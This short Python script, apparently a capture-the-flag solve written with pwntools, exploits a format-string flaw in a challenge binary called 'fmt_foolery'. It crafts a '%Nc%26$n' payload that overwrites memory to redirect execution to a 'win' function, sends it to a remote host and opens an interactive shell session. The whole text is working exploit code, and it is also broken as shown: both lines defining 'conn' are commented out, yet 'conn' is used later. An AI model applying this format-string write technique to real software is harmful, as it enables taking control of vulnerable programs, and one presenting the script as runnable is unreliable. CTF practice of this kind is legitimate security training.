from pwn import *

context.binary = elf = ELF("./fmt_foolery")
#conn = elf.process()
#conn = remote("fmt-foolery.ictf.kctf.cloud", 1337)
gdb.attach(conn)
context.log_level = 'debug'
offset = elf.sym.buf - 0x403d78 + 32

payload = b""
payload += f"%{offset}c".encode()
payload += b"%26$n"
payload += b"a"*(32-len(payload))
payload += p64(elf.sym.win+30)

#gdb.attach(conn)
open("payload", "wb").write(payload + b"\n")
conn.sendline(payload)

conn.recvuntil("ictf")
conn.interactive()
